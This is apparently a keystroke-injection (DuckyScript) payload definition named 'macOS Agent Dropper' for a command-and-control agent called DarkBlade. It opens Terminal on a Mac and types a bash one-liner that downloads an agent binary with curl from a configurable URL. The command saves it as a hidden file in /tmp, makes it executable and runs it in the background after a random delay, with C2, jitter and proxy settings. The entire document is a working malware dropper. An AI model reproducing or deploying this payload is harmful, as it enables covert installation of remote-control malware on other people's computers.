name: macOS Agent Dropper
description: Download, jitter, and background-run DarkBlade agent with optional proxy
script:
REM macOS Agent Dropper with jitter and proxy
CMD SPACE
DELAY 300
STRING Terminal
ENTER
DELAY 800
STRING bash -lc "DB_C2=${C2_URL}; DB_JITTER=${JITTER:=30}; DB_SLEEP=${SLEEP:=60}; DB_PROXY=${PROXY:=}; URL=${AGENT_URL}; f=/tmp/.db; curl -fsSL $URL -o $f; chmod +x $f; (sleep $((RANDOM%$DB_JITTER)); nohup $f >/dev/null 2>&1 &)"
ENTER
